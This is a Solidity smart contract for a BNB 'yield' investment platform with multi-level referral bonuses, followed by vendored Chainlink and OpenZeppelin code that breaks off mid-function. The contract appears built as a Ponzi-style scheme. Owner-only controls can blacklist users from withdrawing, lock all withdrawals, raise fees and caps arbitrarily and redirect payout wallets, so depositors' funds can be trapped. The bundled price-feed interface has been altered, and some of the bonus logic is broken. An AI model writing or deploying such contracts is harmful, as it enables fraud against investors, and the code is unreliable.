// SPDX-License-Identifier: MIT
    //Powered MYP Finance
    pragma solidity ^0.8.0;

    import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
    import "@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol";
    import "@openzeppelin/contracts-upgradeable/utils/ContextUpgradeable.sol";
    import "@openzeppelin/contracts-upgradeable/security/PausableUpgradeable.sol";
    import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
    import "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";
    import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

        struct Tarif {
        uint8 life_days;
        uint256 percent;
        }

        struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint40 time;
        }

        struct SRMLiquidity {
        uint256 amount;
        uint256 time;
        uint256 reggAPRcount;
        uint256 reggAPRtime;
        uint256 reggAPRtimeDissAdd;
        uint256 reggAPRShotTimeDissAdd;
        }

        struct Investor {
        address upline;
        uint256 dividends;
        uint256 match_bonus;
        uint256 checkpoint;
        uint40  last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        bool bonus_deposit;
        uint256 amount_bonus_deposit;
        bool statusTaxWithdraw;
        uint256 whithdrawCount;
        Deposit[] deposits;
        }

        struct Investor_Vip {
        bool vip;
        uint256 TimeForWithdraw;
        uint256 FeeWithdraw;
        bool FeeWithdrawStatus;
        uint256 time_end;
        uint256 checkpointDep;
        uint256 reffCount;
        }

        contract BnbYielding is Initializable, PausableUpgradeable, OwnableUpgradeable, ReentrancyGuardUpgradeable{
            address private marketing_wallet;
            address private ceo;
            address private project;
            address private _owner;
            address payable private secure_wallet;
            uint256 public secure_fee;
            uint256 private marketing_fee;
            uint256 private projectFee;
            uint256 private ceoFee;

            uint256 public invested;
            uint256 public withdrawn;
            uint256 public secure_pool;
            bool    public securePool_Trigger;
            uint256 public marginSRMliquidity;
            uint256 public marginDivPrcSRM;
            uint256 private marginShotInverstor;
            uint256 private PRC_SRM_Liquidity;
            uint256 private PRC_reggAPR;
            uint256 private PRC_reggAPR_MARGIN;
            uint256 public match_bonus;
            uint256 public totalInvestors;
            uint256 public totalWithdrawals;
            uint256 public TIME_STEP;
            uint256 private TIME_STEP_SRM;
            uint256 private TIME_STEP_reggAPR;
            uint256 private TIME_STEP_reggAPR_DissAdd;
            uint256 public initUNIX;
        
            uint256 private MAX_DEPOSIT_BONUS_STEP_TIME;
            uint256 public USER_DEPOSITS_STEP; 
            uint256 private DEPOSIT_BONUS_PERCENT;
            uint256 private PRC_PARTN;
            uint256 private PRC_BONUS_HOLDER;
            uint256 private REINVEST_PERCENT;
            uint8   private TimeReInvest;
            uint256 private maxDaysContract;
            uint256 private maxDaysSRM;

            uint256 public  VIP_TARIF;
            uint256 public  VIP_TARIF_PRICE;
            uint256 private VIP_WITHDRAW_TIME_STEP;
            uint256 private VIP_FeeWithdraw;

            uint256 private TaxWithdrawWhale;
            uint256 private TaxDepositWhale;
            uint256 private MAX_TaxWITHDRAW_COUNT;
            uint256 private tarifPercent;
            uint256 private tarifPercentOld;
            uint256 private accumulator;
            uint8   private tarifDurationMax;
            uint8   private tarifDurationMin;
            uint256 private tarifMinShotInvestor;
            uint256 private tarifMinShotRate;

            uint8   BONUS_LINES_COUNT;
            uint16  PERCENT_DIVIDER;
            uint256 private PERCENTS_DIVIDER;
            uint256 public MIN_WITHDRAW;
            uint256 public MAX_WITHDRAW;
            uint256 public MAX_WITHDRAW_DAILY;
            uint256 public INVEST_MIN_AMOUNT;
            uint8[5] public ref_bonuses;
            bool private _safeliqEnabled;
            bool public _statusSRM;
            bool public _statusARA;
            AggregatorV3Interface internal priceFeed;
            uint256 private tarifMaxShotInvestor;
            uint256 private tarifMaxShotRate;

            mapping(uint8 => Tarif) public tarifs;
            mapping(address => Investor) public investors;
            mapping(address => Investor_Vip) public investorsvip;
            mapping(address => SRMLiquidity) public srmliquids;
            mapping(address => bool) blacklist;
            mapping(address => bool) whitelist;

            event Upline(address indexed addr, address indexed upline, uint256 bonus);
            event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
            event Reinvest(address indexed addr, uint256 amount, uint8 tarif);
            event MatchPayout(address indexed addr, address indexed from, uint256 amount);
            event Withdraw(address indexed addr, uint256 amount);

            function initialize(address payable _marketing_cost,address payable _secure_wallet,address payable _ceo,address payable _project,
                                uint256 timestamp, uint256 _tarifPercent, uint256 _accumulator, uint8 _tarifDurationMax, uint8 _tarifDurationMin) initializer public {
                __Ownable_init();
                __Pausable_init();
                initUNIX = timestamp;

                _owner = OwnableUpgradeable.owner();
                marketing_wallet = _marketing_cost;
                secure_wallet  = _secure_wallet;
                ceo  = _ceo;
                project  = _project;
                tarifPercent = _tarifPercent;
                accumulator = _accumulator;
                tarifDurationMax = _tarifDurationMax;
                tarifDurationMin = _tarifDurationMin;
                priceFeed = AggregatorV3Interface(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE);

                _statusSRM = SRM();
                initializeTaf();

                secure_fee = 300;
                marketing_fee = 40;
                ceoFee = 10;
                projectFee = 100;
                PRC_SRM_Liquidity = 250;
                PRC_reggAPR = 250;
                PRC_reggAPR_MARGIN = 10;
                TIME_STEP = 1 days;
                TIME_STEP_SRM = 1 days;
                TIME_STEP_reggAPR = 7 days;
                TIME_STEP_reggAPR_DissAdd = 1 days;
                MAX_DEPOSIT_BONUS_STEP_TIME = 5 days;
                USER_DEPOSITS_STEP = 10 ether;
                DEPOSIT_BONUS_PERCENT = 10 * 1e15;
                PRC_PARTN = 10;
                PRC_BONUS_HOLDER = 10;
                REINVEST_PERCENT = 100;
                TimeReInvest = 25;
                maxDaysContract = 25 * 86400;
                maxDaysSRM = 25 * 86400;
                VIP_TARIF = 20;
                VIP_TARIF_PRICE = 20 * 1e18;
                VIP_WITHDRAW_TIME_STEP = 1728000;
                VIP_FeeWithdraw = 300;
                TaxWithdrawWhale = 450;
                TaxDepositWhale = 400;
                MAX_TaxWITHDRAW_COUNT = 1;
                tarifMinShotInvestor = 100;
                tarifMinShotRate = 50;
                BONUS_LINES_COUNT = 5;
                PERCENT_DIVIDER = 1000;
                PERCENTS_DIVIDER = 1000;
                MIN_WITHDRAW = 0.1 ether;
                MAX_WITHDRAW = 5 ether;
                MAX_WITHDRAW_DAILY = 5 ether;
                INVEST_MIN_AMOUNT = 0.1 ether;
                ref_bonuses = [30, 40, 50, 60, 70];

            }

            function pause() public onlyOwner {
            _pause();
            }

            function unpause() public onlyOwner {
            _unpause();
            }

            function initializeTaf() private {
                if(tarifPercent != tarifPercentOld) {
                    for (uint8 i = tarifDurationMin; i <= tarifDurationMax; i++) {
                    tarifs[i] = Tarif(i, tarifPercent);
                    tarifPercent+= accumulator;
                    }
                tarifPercent = tarifs[tarifDurationMin].percent;
                }
                tarifPercentOld = tarifPercent;
            }
            
            function deposit(uint8 _tarif, address _upline) external payable NonBlackListed whenNotPaused nonReentrant {
                require(!isContract(msg.sender) && msg.sender == tx.origin);
                require(tarifs[_tarif].life_days > 0, "Tarif not found");
                require(msg.value >= INVEST_MIN_AMOUNT, "Minimum deposit amount is 0.1 BNB");
                require(block.timestamp > initUNIX, "Not started yet");

                Investor storage investor = investors[msg.sender];
                Investor_Vip storage investorvip = investorsvip[msg.sender];
                require(investor.deposits.length < 100, "Max 100 deposits per address");
                _setUpline(msg.sender, _upline, msg.value);

                if (investor.deposits.length == 0) {
                    investor.checkpoint = block.timestamp;
                    totalInvestors++;
                }

                investor.deposits.push(Deposit({
                tarif: _tarif,
                amount: msg.value,
                time: uint40(block.timestamp)
                }));

                investor.total_invested += msg.value;
                invested += msg.value;
                _refPayout(msg.sender, msg.value);
                SRM();

                if(msg.value >= USER_DEPOSITS_STEP){
                    investor.bonus_deposit = true;
                    investor.amount_bonus_deposit = DEPOSIT_BONUS_PERCENT;
                }else {
                    investor.bonus_deposit = false;
                }

                if(_tarif == VIP_TARIF && msg.value >= VIP_TARIF_PRICE){
                    investorvip.vip = true;
                    investorvip.TimeForWithdraw = investor.checkpoint +  VIP_WITHDRAW_TIME_STEP;
                    if (msg.value >= VIP_TARIF_PRICE) {
                        investorvip.FeeWithdraw = VIP_FeeWithdraw + ((msg.value - VIP_TARIF_PRICE) / 1e18) * 10;
                    } 
                } else {
                    investorvip.vip = false;
                }

                if(msg.value >= MAX_WITHDRAW_DAILY*TaxDepositWhale/(PERCENTS_DIVIDER)){
                    investor.statusTaxWithdraw = false;
                    investor.whithdrawCount = 0;
                }

                for(uint256 i = 0; i < investor.deposits.length; i++) {
                Deposit storage dep = investor.deposits[i];
                Tarif storage tarif = tarifs[dep.tarif];

                uint256 time_end = dep.time + tarif.life_days * TIME_STEP;
                investorvip.time_end = time_end;
                }

                investorvip.checkpointDep = block.timestamp;
                payable(marketing_wallet).transfer(msg.value * marketing_fee/(PERCENTS_DIVIDER));
                payable(ceo).transfer(msg.value * ceoFee/(PERCENTS_DIVIDER));
                payable(project).transfer(msg.value * projectFee/(PERCENTS_DIVIDER));   
                emit NewDeposit(msg.sender, msg.value, _tarif);
                ARA();
            }

            function withdraw() external NonBlackListed whenNotPaused whenNotSafeLiqEnabled nonReentrant { 
                Investor storage investor = investors[msg.sender];
                Investor_Vip storage investorvip = investorsvip[msg.sender];
                _payout(msg.sender);
                require(getContractBalance() > 0, "Insufficient pool balance");
                require(investor.checkpoint + (TIME_STEP) < block.timestamp, "only once a day");
                require(investor.dividends > 0 || investor.match_bonus > 0, "Zero amount");

                if(SRM() == true && block.timestamp < investorvip.time_end) {
                    revert("You can only withdraw at the end of your contract period, *SRM Enabled");
                }
                
                if(block.timestamp < investorvip.TimeForWithdraw) {
                    revert("You are a vip investor and you cannot withdraw if the contract period has not ended");
                }
                
                uint256 amount_taxWithdrawWhale;
                uint256 amount_taxWithdrawVip;
                uint8 maxIncrementBonusDeposit;
                bool statusMAXWithdraw = false;

                if(investor.bonus_deposit == true) {
                    if(investor.whithdrawCount > 1) {
                        investor.amount_bonus_deposit += 0;
                    }
                    maxIncrementBonusDeposit++;
                } else if (maxIncrementBonusDeposit > 5) {
                        investor.bonus_deposit = false;
                        investor.amount_bonus_deposit  = 0;
                } else {
                    investor.amount_bonus_deposit  = 0;
                }

                uint256 bonusAmount = investor.dividends * investor.amount_bonus_deposit / 1e18;
                uint256 amount = investor.dividends + bonusAmount + investor.match_bonus;
                uint256  insurance_amt =  amount * secure_fee/(PERCENTS_DIVIDER);
                secure_wallet.transfer(insurance_amt);
                amount = amount - insurance_amt;

                require(amount >= MIN_WITHDRAW, "Investor does not have the withdrawal minimum");
                
                if (investorvip.vip == true && amount > MAX_WITHDRAW) {
                    investorvip.FeeWithdrawStatus = true;
                } if (investorvip.FeeWithdrawStatus == false && amount > MAX_WITHDRAW_DAILY && !iswhitelist(msg.sender)) {
                    statusMAXWithdraw = true;
                    investor.dividends = amount - MAX_WITHDRAW_DAILY;
                    amount = MAX_WITHDRAW_DAILY;
                    if (investor.whithdrawCount >= MAX_TaxWITHDRAW_COUNT) {
                    investor.statusTaxWithdraw = true;
                    }
                } if (iswhitelist(msg.sender)) {
                    investor.statusTaxWithdraw = false;
                    amount = amount + (amount * PRC_PARTN / PERCENTS_DIVIDER);
                } if (investorvip.FeeWithdrawStatus == true) {
                    if (investorvip.FeeWithdraw > 0) {
                    amount_taxWithdrawVip = amount * investorvip.FeeWithdraw / (PERCENTS_DIVIDER);
                    amount = amount - amount_taxWithdrawVip;
                    investorvip.vip = false;
                    investorvip.FeeWithdrawStatus = false;
                    investorvip.FeeWithdraw = 0;
                } } 
                if (investor.statusTaxWithdraw == true) {
                    amount_taxWithdrawWhale = amount * TaxWithdrawWhale / (PERCENTS_DIVIDER);
                    amount = amount - amount_taxWithdrawWhale;
                }
                
                if(statusMAXWithdraw == false){
                    investor.dividends = 0;
                }

                investor.match_bonus = 0;
                uint256 amountTaxTotal = amount_taxWithdrawWhale + amount_taxWithdrawVip;

                uint256 reinvestAmount = amount * REINVEST_PERCENT / (PERCENTS_DIVIDER);
                investor.total_invested += reinvestAmount;
                uint256 reinvestAmountTax =  reinvestAmount * secure_fee/(PERCENTS_DIVIDER);
                uint256 reinvestAmountEv = reinvestAmount - reinvestAmountTax;
		        emit Reinvest(msg.sender, reinvestAmountEv, TimeReInvest);
                amount -= reinvestAmount;

                secure_wallet.transfer(amountTaxTotal + reinvestAmountTax);
                secure_pool = secure_pool + insurance_amt + amountTaxTotal + reinvestAmountTax;
                investor.total_withdrawn += amount;
                withdrawn += amount;

                investor.checkpoint = block.timestamp;
                payable(msg.sender).transfer(amount);
                
                emit Withdraw(msg.sender, amount);
                totalWithdrawals++;
                investor.whithdrawCount++;
                SRM();
                ARA();
            }

            function _payout(address _addr) private {
                uint256 payout = this.payoutOf(_addr);
                if(payout > 0) {
                    investors[_addr].last_payout = uint40(block.timestamp);
                    investors[_addr].dividends += payout;
                }
            }

            function _refPayout(address _addr, uint256 _amount) private {
                address up = investors[_addr].upline;
                uint256 reffCounts = investorsvip[up].reffCount;
                uint8 refBonusPosition;
                uint256 bonus;
                uint8 diss = 1;
                if(reffCounts <= 5 - diss) {
                    refBonusPosition = 0;
                } else if (reffCounts <= 10 - diss) {
                    refBonusPosition = 1;
                } else if (reffCounts <= 15 - diss) {
                    refBonusPosition = 2;
                } else if (reffCounts <= 20 - diss) {
                    refBonusPosition = 3;
                } else if (reffCounts >= 21 - diss) {
                    refBonusPosition = 4;
                }

                bonus = _amount * ref_bonuses[refBonusPosition] / PERCENT_DIVIDER;                   
                investors[up].match_bonus += bonus;
                investors[up].total_match_bonus += bonus;
                match_bonus += bonus;
                emit MatchPayout(up, _addr, bonus);
                investorsvip[up].reffCount++;
            }

           

            function _setUpline(address _addr, address _upline, uint256 _amount) private {
                if(investors[_addr].upline == address(0) && _addr != _owner) {
                    if(investors[_upline].deposits.length == 0) {
                        if(!isActiveInvestor(_addr) || _addr == _upline){
                            _upline = secure_wallet;
                        }
                    }
                    investors[_addr].upline = _upline;
                    emit Upline(_addr, _upline, _amount / 100);
                }
            }

            function payoutOf(address _addr) view external whenNotSafeLiqEnabled returns(uint256 value) {
             Investor storage investor = investors[_addr];
                for(uint256 i = 0; i < investor.deposits.length; i++) {
                Deposit storage dep = investor.deposits[i];
                Tarif storage tarif = tarifs[dep.tarif];

                uint256 time_end = dep.time + tarif.life_days * 86400;
                uint40 from = investor.last_payout > dep.time ? investor.last_payout : dep.time;
                uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

                if(from < to) {
                    value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
                    uint256 timeMultiplier =(block.timestamp - investor.checkpoint) / (TIME_STEP) * (PRC_BONUS_HOLDER); //1% per day
                    uint256 holdBonus = value * timeMultiplier / PERCENTS_DIVIDER;
                    value += holdBonus;    
                    }
                }
            return value;
            }

            function getLatestPrice() public view returns (uint256) {
                (,uint256 price,,,) = priceFeed.latestRoundData();
                return price;
            }
            
            function SRM() public  returns (bool statusSRM) {
                SRMLiquidity storage srmliquidity = srmliquids[address(this)];
                uint256 durationSRM = maxDaysSRM;
                uint256 checkpointSRM;
                if(totalWithdrawals == 0 && totalInvestors == 0){
                    _statusSRM = false;
                    return statusSRM = false;
                }
                marginDivPrcSRM = (totalWithdrawals * 1e18 / totalInvestors) / 1e16;
                    if (securePool_Trigger == true) {
                        secure_fee = 500;
                        MAX_WITHDRAW_DAILY = 0.001 ether;
                        checkpointSRM = block.timestamp;
                    } else if(marginDivPrcSRM <= 25) {
                        TIME_STEP = 86400;
                        secure_fee = 300;
                        MAX_WITHDRAW_DAILY = 5 ether;
                    } else if (marginDivPrcSRM <= 30) {
                        TIME_STEP = 604800;
                        secure_fee = 325;
                        MAX_WITHDRAW_DAILY = 2 ether;
                    } else if (marginDivPrcSRM <= 35) {
                        secure_fee = 350;
                        MAX_WITHDRAW_DAILY = 1 ether;
                    } else if (marginDivPrcSRM >= 40) {
                        TIME_STEP = 86400;
                        secure_fee = 400;
                        MAX_WITHDRAW_DAILY = 0.001 ether; 
                        _statusSRM = false;
                        checkpointSRM = block.timestamp;
                        return statusSRM = false;
                    } 
                
            uint256 balanceContractNow = getContractBalance();
            uint256 checkpointSRMLiquiNow = block.timestamp;

                if(srmliquidity.time < checkpointSRMLiquiNow || srmliquidity.time == 0) {
                    srmliquidity.time = block.timestamp + TIME_STEP_SRM;
                    if(srmliquidity.amount == 0) {
                        _SRM();
                    }
                    if(balanceContractNow <= marginSRMliquidity && marginSRMliquidity != 0) {
                        securePool_Trigger = true;
                        MAX_WITHDRAW_DAILY = 0;
                        checkpointSRM = block.timestamp;
                        _statusSRM = true;
                        return statusSRM = true;
                    } else {
                        _SRM();
                        securePool_Trigger = false;
                        if(block.timestamp < (checkpointSRM + durationSRM) && statusSRM == true){
                                _statusSRM = true;
                                return statusSRM = true;
                            } else {
                                _statusSRM = false;
                                return statusSRM = false;
                            }
                    }
                }
                _statusSRM = false;
                return statusSRM = false;
            }

            function _SRM() private{
                SRMLiquidity storage srmliquidity = srmliquids[address(this)];
                uint256 srmliquidsPRC_SRM;
                srmliquidity.amount = getContractBalance();
                srmliquidsPRC_SRM = srmliquidity.amount * PRC_SRM_Liquidity / (PERCENTS_DIVIDER);
                marginSRMliquidity = srmliquidity.amount - srmliquidsPRC_SRM;
            }
            
            function ARA() public {
                SRMLiquidity storage srmliquidity = srmliquids[address(this)];
                if(totalInvestors < marginShotInverstor || marginShotInverstor == 0) {
                    if(srmliquidity.reggAPRtimeDissAdd < block.timestamp) {
                        srmliquidity.reggAPRtimeDissAdd = block.timestamp + TIME_STEP_reggAPR_DissAdd;
                        if(marginShotInverstor !=0 ) {
                            tarifPercent-= accumulator;
                            _statusARA = true;
                            if(tarifPercent < tarifMinShotInvestor) {
                                tarifPercent = tarifMinShotInvestor;
                            }
                        }
                    }    
                    if(srmliquidity.reggAPRtime < block.timestamp) {
                        srmliquidity.reggAPRtime = block.timestamp + TIME_STEP_reggAPR;
                        if(srmliquidity.reggAPRcount == 0) {
                            _reggAPR();
                        } else {
                            _reggAPR();  
                            }
                    } 
                } else {
                    if(srmliquidity.reggAPRtimeDissAdd < block.timestamp){
                        srmliquidity.reggAPRtimeDissAdd = block.timestamp + TIME_STEP_reggAPR_DissAdd;
                        if(srmliquidity.reggAPRtime < block.timestamp) {
                            srmliquidity.reggAPRtime = block.timestamp + TIME_STEP_reggAPR;
                            _reggAPR();
                        }
                        tarifPercent += accumulator;
                        _statusARA = false;
                        if(tarifPercent > tarifMaxShotInvestor) {
                            tarifPercent = tarifMaxShotInvestor;
                        }
                    }
                }

                uint256 balancePoolMainUSD = (getContractBalance() * (getLatestPrice() / 1e8)) / 1e18;
                uint256 marginShotRateDiv = balancePoolMainUSD * PRC_reggAPR_MARGIN / (PERCENTS_DIVIDER);
                if(totalInvestors > marginShotRateDiv ) {
                    if(srmliquidity.reggAPRShotTimeDissAdd < block.timestamp) {
                        srmliquidity.reggAPRShotTimeDissAdd = block.timestamp + TIME_STEP_reggAPR_DissAdd;
                        tarifPercent -= accumulator;
                        _statusARA = true;
                        if(tarifPercent < tarifMinShotRate) {
                            tarifPercent = tarifMinShotRate;
                        }
                    }    
                } else {
                    if(srmliquidity.reggAPRShotTimeDissAdd < block.timestamp){
                        srmliquidity.reggAPRShotTimeDissAdd = block.timestamp + TIME_STEP_reggAPR_DissAdd;
                        tarifPercent += accumulator;
                        _statusARA = false;
                        if(tarifPercent > tarifMaxShotRate) {
                            tarifPercent = tarifMaxShotRate;
                        }
                    }
                }
                initializeTaf();
            }

            function _reggAPR() private {
                uint256 shotInverstor;
                SRMLiquidity storage srmliquidity = srmliquids[address(this)];
                srmliquidity.reggAPRcount = totalInvestors;
                shotInverstor = srmliquidity.reggAPRcount * PRC_reggAPR / (PERCENTS_DIVIDER);
                marginShotInverstor = srmliquidity.reggAPRcount + shotInverstor;
            }
            
            function investorInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256 _reffCount, uint256 _checkpoint) {
                    Investor storage investor = investors[_addr];
                    uint256 payout = this.payoutOf(_addr);
                    return (
                        payout + investor.dividends + investor.match_bonus,
                        investor.total_invested,
                        investor.total_withdrawn,
                        investor.total_match_bonus,
                        investorsvip[_addr].reffCount,
                        investor.checkpoint
                    );
            }

            function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus, uint256 _secure_pool, uint256 _initUNIX, uint256 _totalInvestors, uint256 _totalWithdrawals) {
                return (invested, withdrawn, match_bonus, secure_pool, initUNIX, totalInvestors, totalWithdrawals);
            }

            function isActiveInvestor(address userAddress) public view returns (bool) {
            Investor storage investor = investors[userAddress];
            uint256 checkpointDeps = investorsvip[userAddress].checkpointDep;
            if (investor.deposits.length > 0 && checkpointDeps <= (checkpointDeps + maxDaysContract) ) {
                    return true;
                }
            return false;
            }

            function getContractBalance() public view returns (uint256) {
                return address(this).balance;
            }

            function PRC_Fees(uint256 value1, uint256 value2, uint256 value3, uint256 value4) external onlyOwner {
                secure_fee = value1;
                marketing_fee = value2;
                projectFee = value3;
                ceoFee = value4;
            }

            function PRC_Tarif(uint256 value1, uint256 value2, uint8 value3, uint8 value4) external onlyOwner {
                tarifPercent = value1;
                accumulator = value2;
                tarifDurationMax = value3;
                tarifDurationMin = value4;
                initializeTaf();
            }

            function Set_TimeStep(uint256 value) external onlyOwner {
                TIME_STEP = value;
            }

            function PRC_Partn(uint256 value) external onlyOwner {
                PRC_PARTN = value;
            }

            function Values_ReInvest(uint256 value1, uint8 value2) external onlyOwner {
                REINVEST_PERCENT = value1;
                TimeReInvest = value2;
            }

            function Set_BonusDeposit(uint256 value1, uint256 value2, uint256 value3) external onlyOwner {
                MAX_DEPOSIT_BONUS_STEP_TIME = value1;
                USER_DEPOSITS_STEP = value2;
                DEPOSIT_BONUS_PERCENT = value3;
            }

            function Set_ValueVip(uint256 value1, uint256 value2, uint256 value3, uint256 value4) external onlyOwner {
                VIP_TARIF = value1;
                VIP_TARIF_PRICE = value2;
                VIP_WITHDRAW_TIME_STEP = value3;
                VIP_FeeWithdraw = value4;
            }

            function Set_ValueSRM(uint256 value1, uint256 value2 , bool value3) external onlyOwner {
                maxDaysSRM = value1;
                TIME_STEP_SRM = value2;
                _statusSRM = value3;
                SRM();
            }
            
            function Set_Regg(uint256 value1, uint256 value2 , uint256 value3, uint256 value4, uint256 value5, uint256 value6, uint256 value7, uint256 value8) external onlyOwner {
                PRC_reggAPR = value1;
                PRC_reggAPR_MARGIN = value2;
                TIME_STEP_reggAPR = value3;
                TIME_STEP_reggAPR_DissAdd = value4;
                tarifMinShotInvestor = value5;
                tarifMinShotRate = value6;
                tarifMaxShotInvestor = value7;
                tarifMaxShotRate = value8;

            }

            function Set_MinMax_Withdraw(uint256 value1, uint256 value2, uint256 value3) external onlyOwner {
                MIN_WITHDRAW = value1;
                MAX_WITHDRAW = value2;
                MAX_WITHDRAW_DAILY = value3;
            }

            function Set_InvestMin(uint256 value) external onlyOwner {
                INVEST_MIN_AMOUNT = value;
            }
            
            function Set_TaxWhales(uint256 value1, uint256 value2, uint256 value3) external onlyOwner {
                TaxWithdrawWhale = value1;
                TaxDepositWhale = value2;
                MAX_TaxWITHDRAW_COUNT = value3;
            }

            function PRC_BonusHolder(uint256 value) external onlyOwner {
                PRC_BONUS_HOLDER = value;
            }

            function Change_Wllts(address value1, address value2, address value3, address value4) external onlyOwner {
                marketing_wallet = payable(value1);
                project = payable(value2);
                secure_wallet = payable(value3);
                ceo = payable(value4);
            }

            function isContract(address addr) internal view returns (bool) {
            uint256 size;
            assembly { size := extcodesize(addr) }
            return size > 0;
            }

            function donate() external payable returns(bool) {
            payable(_owner).transfer(msg.value);
            return true;
            }

            function injectLiquidity() external payable returns(bool) {
                SRM();
                return true;
            }

            function addBlacklist(address _address) public onlyOwner {
                blacklist[_address] = true;
            }

            function removeBlacklist(address _address) public onlyOwner {
                blacklist[_address] = false;
            }
            function isBlackListed(address _address) public view returns(bool) {
                return blacklist[_address];
            }

            modifier NonBlackListed() {
                require(!isBlackListed(msg.sender));
                _;
            }

            function SetWhitelist(address _address, bool _state) public onlyOwner {
                whitelist[_address] = _state;
            }

            function iswhitelist(address _address) public view returns(bool) {
                return whitelist[_address];
            }

            function SafeLiqEnabled() public  view virtual returns (bool) {
                return _safeliqEnabled;
            }

            modifier whenNotSafeLiqEnabled() {
                require(!SafeLiqEnabled(), "SafeLiq: Enabled");
                _;
            }

            modifier whenSafeLiqEnabled() {
                require(SafeLiqEnabled(), "SafeLiq: Disabled");
                _;
            }

            function SafeLiqEnable() public onlyOwner virtual whenNotSafeLiqEnabled {
                _safeliqEnabled = true;
            }

            function SafeLiqDisable() public onlyOwner virtual whenSafeLiqEnabled {
                _safeliqEnabled = false;
            }
        }

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface AggregatorV3Interface {
  function decimals() external view returns (uint8);

  function description() external view returns (string memory);

  function version() external view returns (uint256);

  // getRoundData and latestRoundData should both raise "No data present"
  // if they do not have data to report, instead of returning unset values
  // which could be misinterpreted as actual reported values.
  function getRoundData(uint80 _roundId)
    external
    view
    returns (
      uint80 roundId,
      int256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    );

  function latestRoundData()
    external
    view
    returns (
      uint80 roundId,
      uint256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    );
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)

pragma solidity ^0.8.0;
import "../proxy/utils/Initializable.sol";

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuardUpgradeable is Initializable {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    function __ReentrancyGuard_init() internal onlyInitializing {
        __ReentrancyGuard_init_unchained();
    }

    function __ReentrancyGuard_init_unchained() internal onlyInitializing {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }

    /**
     * @dev This empty reserved space is put in place to allow future versions to add new
     * variables without shifting down storage in the inheritance chain.
     * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps
     */
    uint256[49] private __gap;
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/ContextUpgradeable.sol";
import "../proxy/utils/Initializable.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract OwnableUpgradeable is Initializable, ContextUpgradeable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function __Ownable_init() internal onlyInitializing {
        __Ownable_init_unchained();
    }

    function __Ownable_init_unchained() internal onlyInitializing {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
